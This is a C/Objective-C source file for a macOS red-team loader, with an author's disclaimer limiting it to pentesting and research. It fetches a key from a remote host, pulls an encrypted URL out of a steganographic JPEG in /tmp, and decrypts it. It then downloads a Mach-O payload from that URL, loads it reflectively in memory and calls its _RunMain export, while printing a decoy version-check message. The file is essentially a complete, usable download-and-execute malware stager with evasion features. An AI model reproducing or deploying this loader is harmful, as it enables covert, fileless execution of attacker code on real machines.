//Written by AsaurusRex, DO NOT use this project for purposes other than legitimate red teaming/pentesting jobs, or research.  DO NOT use this for illegal activity of any kind, and know that this project is intended for research purposes and to help advance the missions of both red and blue teams.


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "macho.h"

#import <Foundation/Foundation.h>

//decrypt our bytes 
unsigned char* DecryptBytes(unsigned char* encrypted_bytes, unsigned char* key, int size_encrypted_bytes, int size_key)
{
        //printf("Beginning Decryption...\n");
        unsigned char* decrypted_code = malloc(size_encrypted_bytes);
		//decryption loop	
        int integer;
        
		for (int i = 0; i < size_encrypted_bytes; i++) 
		{
            //generic wait function
            // if (i % 2 == 0)
            // {
            //     sleep(1);
            // }
            //determine the key byte
            
            if (size_key < i+1)
            {
                integer = encrypted_bytes[i] - key[i%size_key];
            }

            else
            {
                integer = encrypted_bytes[i] - key[i];
            }

			
			
            if (integer < 0)
			{
				integer = 256 + integer;
			}
			decrypted_code[i] = (unsigned char)integer;
		}
	
	//weird error where random bytes are added to the end of decrypted string - this while loop section will prevent it.

	int s = strlen(decrypted_code);
    
    while (s > size_encrypted_bytes)
    {
        // printf("%d is length decrypted, but %d is size it should be!\n", s, size_encrypted_bytes);
        // printf("Initiating another round...\n"); 
        
        unsigned char* decrypted = malloc(size_encrypted_bytes); //maybe clean this up...
        decrypted = DecryptBytes(encrypted_bytes, key, size_encrypted_bytes, size_key);
        if (strlen(decrypted) == size_encrypted_bytes)
        {  
        return decrypted;
        }
        break;

    }

    
    
    return decrypted_code;
}

//Find header byte offset
int find_header(unsigned const char* buffer, int size_file)
{
    //place header offset bytes here:
    int head_byte_offset;
unsigned char header1[1] = { 0x59 };
unsigned char header2[1] = { 0x4e };
    //Find the index of where encrypted byte stream begins
for (int i =0; i< size_file; i++)
{
    if (buffer[i] == header1[0])
    {
     if (buffer[i+1] == header1[0])
    {
        if (buffer[i+2] == header1[0])
    {
        if (buffer[i+3] == header1[0])
    {
        if (buffer[i+4] == header1[0])
    {   
        if (buffer[i+5] == header1[0])
        {
            ////printf("%d is the beginning, and %02X is the byte\n", i, buffer[i]);
            head_byte_offset = i+6;

        }
    }
    }
    }
    }
    }

    if (buffer[i] == header2[0])
    {
        if (buffer[i+1] == header2[0])
    {
        if (buffer[i+2] == header2[0])
    {
        if (buffer[i+3] == header2[0])
    {
        if (buffer[i+4] == header2[0])
    {
        if (buffer[i+5] == header2[0])
        {
            ////printf("%d is the beginning, and %02X is the byte\n", i, buffer[i]);
            head_byte_offset = i+6;
        }
    }
    }
    }
    }
    }
}
return head_byte_offset;
}

//find last byte of offset
int find_footer(unsigned const char* buffer, int size_file)
{
    //place trail offset bytes here:
    int trail_byte_offset;
unsigned char tail1[1] = { 0xab };
unsigned char tail2[1] = { 0x97 };
    
    for (int i =0; i< size_file; i++)
    {
    //Find the index of where the byte stream ends
    if (buffer[i] == tail1[0])
    {
    if (buffer[i+1] == tail1[0])
{
    if (buffer[i+2] == tail1[0])
{
    if (buffer[i+3] == tail1[0])
{
    if (buffer[i+4] == tail1[0])
{   
    if (buffer[i+5] == tail1[0])
        {
            ////printf("%d is the end, and %02X is the byte\n", i, buffer[i]);
            trail_byte_offset = i;
        }
    }
    }
    }
    }
    }

    if (buffer[i] == tail2[0])
    {
    if (buffer[i+1] == tail2[0])
{
    if (buffer[i+2] == tail2[0])
{
    if (buffer[i+3] == tail2[0])
{
    if (buffer[i+4] == tail2[0])
{
    if (buffer[i+5] == tail2[0])
        {
            ////printf("%d is the end, and %02X is the byte\n", i, buffer[i]);
            trail_byte_offset = i;
        }
    }
    }
    }
    }
    }
    
}
return trail_byte_offset;
}

int execution(unsigned char* decrypted_bytes)
{
    ////printf("Beginning attack run\n");
    NSString *stringURL = [NSString stringWithFormat:@"%s", decrypted_bytes];
    
    NSURL *url = [NSURL URLWithString:stringURL];
    //the error resides in the line below
    
    NSData *urlData = [NSData dataWithContentsOfURL:url];
    
   ////printf("Dingleberry\n");
    
    if ( urlData )
    {
        //sleep(1);
       
    int size = urlData.length;
    ////printf("%d", size);
        
    
    const char* buffer = (const char*)[urlData bytes];
    
   // Force type to MH_BUNDLE
   ((uint32_t *)buffer)[3] = 0x8;
   func_t funcs;
   printf("Validating online version information..."); //DO NOT COMMENT OUT OR REMOVE THIS - OR ELSE CODE WILL BREAK 
   // Resolve the functions
   if (!macho_bootstrap(&funcs))
   {
      //print("Couldn't find libdyld in memory\n");
      exit(-1);
   }

   // Load the module
   void *module = macho_load(&funcs, (void *)buffer, size);

   if (!module)
   {
      //print("Couldn't load the module\n");
      return 0;
   }

   //print("Module loaded!\n");
   void (*f)() = macho_sym(&funcs, module, "_RunMain"); //might need to change this to reflect the export function of your dylib

   if (!f)
   {
      //print("Couldn't resolve the symbol\n");
      return 0;
   }

   //print("All good, let's exec!\n");

   // And we are done!
   f();
    }
    
   return 0;
}

int main()
{
sleep(2); //added delay because it seems to produce more reliable execution
//key here:
NSString *stringURL = [NSString stringWithFormat:@"http://testdomain:8000/key2"];NSURL *url = [NSURL URLWithString:stringURL];
//the error resides in the line below

NSData *urlData = [NSData dataWithContentsOfURL:url];
//printf("Validating online version information..."); //DO NOT COMMENT OUT OR REMOVE THIS - OR ELSE CODE WILL BREAK 
////printf("Dingleberry\n");

//Check for key
if ( !urlData )
{
    //sleep(1);
    
    //int size = urlData.length;
    printf("Key does not exist!\n");
   
    return -1;
}

printf("Successfully fetched key!\n");
int size_key = urlData.length;
//printf("%d is the size of the key!\n", size_key);

unsigned char* key = (unsigned char*)[urlData bytes];


//stego file location:
NSString *file = [NSString stringWithFormat:@"/tmp/compile_test.jpg"];
NSData* data0 = [NSData dataWithContentsOfFile:file options:NSDataReadingUncached error:NULL];

unsigned const char* buffer = (unsigned const char*)[data0 bytes];
////printf("%d is the size of the file\n", data0.length);

int size_file = data0.length;

int head_byte_offset = find_header(buffer, size_file);
int trail_byte_offset = find_footer(buffer, size_file);

////printf("%d is head byte position, %d is trail byte position\n", head_byte_offset, trail_byte_offset);
int j = head_byte_offset;
int size_encrypted_bytes = trail_byte_offset-head_byte_offset;
unsigned char* encrypted_bytes = malloc(size_encrypted_bytes); //carve out as much memory as we need for our encrypted bytes based on offsets

int count = 0;
//carve out the encrypted bytes
for (j; j < trail_byte_offset+1; j++)
{
    
    encrypted_bytes[count] = buffer[j];
    ////printf("%02X", buffer[j]);
    count = count + 1; //use count to increase index for encrypted_bytes
}

unsigned char* decrypted = malloc(size_encrypted_bytes);
decrypted = DecryptBytes(encrypted_bytes, key, size_encrypted_bytes, size_key);
free(buffer);


if (execution(decrypted))
{
free(decrypted);
free(encrypted_bytes);


//printf("Finished up");
}
else{
    //printf("error");
    exit(-1);
}

return 0;
}


